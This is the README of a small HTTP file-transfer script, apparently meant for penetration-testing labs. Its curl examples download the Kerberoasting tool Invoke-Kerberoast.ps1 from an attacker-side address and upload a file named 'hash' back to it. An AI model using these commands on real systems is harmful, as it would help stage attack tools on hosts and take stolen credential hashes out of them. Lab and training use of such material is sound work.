# SimpleHTTPTransfer

Just a little script to simplify the file transfer from or to a remote server.
Add it to your PATH and just execute it in the folder where you want to download/upload files.

## List
```curl http://10.10.14.10:5000/```

## Download

```curl http://10.10.14.10:5000/Invoke-Kerbeoast.ps1 > Invoke-Kerberoast.ps1```

## Upload

```curl http://10.10.14.10:5000/ -F 'file=@hash'```
